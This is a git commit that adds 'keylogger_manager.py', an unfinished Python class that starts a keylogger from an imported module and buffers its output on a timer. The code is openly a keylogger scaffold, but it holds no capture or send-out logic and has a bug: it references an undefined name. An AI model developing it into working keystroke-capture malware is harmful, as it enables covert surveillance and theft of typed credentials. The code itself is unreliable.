a4308ccce0a2aa958099fb6ba5a114565f5d4173
daniel <noatenen22@gmial.com>
2025-02-13 12:36:53 +0200

    manger update

---
+++ keylogger_manager.py
@@ -0,0 +1,49 @@
+import time,datetime ,ctypes
+import kyllog
+
+
+class Manager:
+    current_time = '%d/%m/%Y  %H:%M'
+
+    def __init__(self,interval = 60):
+        self.logger = kyllog.mein_keylogg.start()
+        self.interval = interval
+        self.buffer = []
+        self.running = True
+        self.time_man = None
+
+    def process_buffer(self):
+        while self.running:
+            time.sleep(self.interval)
+
+    def time_Manager(self):
+        self.time_man = datetime.datetime.fromtimestamp(self.logger.time).strftime(keylogger_manager.current_time)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
